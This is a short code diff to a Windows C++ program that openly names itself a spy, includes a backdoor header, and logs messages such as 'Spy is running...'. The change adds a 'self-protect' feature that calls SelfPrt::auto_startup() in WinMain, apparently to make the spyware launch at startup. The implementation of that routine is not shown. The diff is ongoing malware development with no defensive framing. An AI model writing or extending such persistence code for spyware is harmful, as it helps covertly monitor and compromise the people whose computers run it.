@@ -6,6 +6,7 @@
 #include "proc.h"
 #include "main.h"
 #include "bdr\backdoor.h"
+#include "shd\selfprt.h"
 #include "../../log-cpp/log.h"
 #include <Gdiplus.h>
 #include <Shlwapi.h>
@@ -37,6 +38,9 @@ int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In
 		LOG_E("Can not load spy!");
 		return ERROR_CODE;
 	}
+	
+	LOG_I("Start self-protect feature");
+	start_self_protect();
 
 	LOG_I("Spy is running...");
 
@@ -199,4 +203,9 @@ void install_packs()
 			return 0;
 		}, NULL, NULL, &thread_id);
 	}
+}
+
+void start_self_protect()
+{
+	SelfPrt::auto_startup();
 }
